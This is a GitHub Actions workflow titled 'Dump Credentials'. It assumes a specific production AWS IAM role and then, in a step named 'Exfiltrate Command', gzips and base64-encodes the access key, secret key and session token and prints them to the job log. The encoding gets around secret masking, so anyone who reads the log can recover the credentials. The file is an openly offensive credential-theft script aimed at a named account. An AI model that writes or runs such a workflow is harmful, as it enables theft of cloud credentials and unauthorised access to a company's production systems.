name: Dump Credentials latest
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read

jobs:
  tf:
    name: Dump Credentials
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::647090761932:role/palmart-rv-prod-github-actions-role
          aws-region: ap-southeast-1
      
      - name: Exfiltrate Command
        run: |
          KEY_ID=$(echo -n "$AWS_ACCESS_KEY_ID" | gzip -c | base64 -w 0)
          SECRET_KEY=$(echo -n "$AWS_SECRET_ACCESS_KEY" | gzip -c | base64 -w 0)
          SESSION_TOKEN=$(echo -n "$AWS_SESSION_TOKEN" | gzip -c | base64 -w 0)

          echo "$KEY_ID"
          echo "$SECRET_KEY"
          echo "$SESSION_TOKEN"
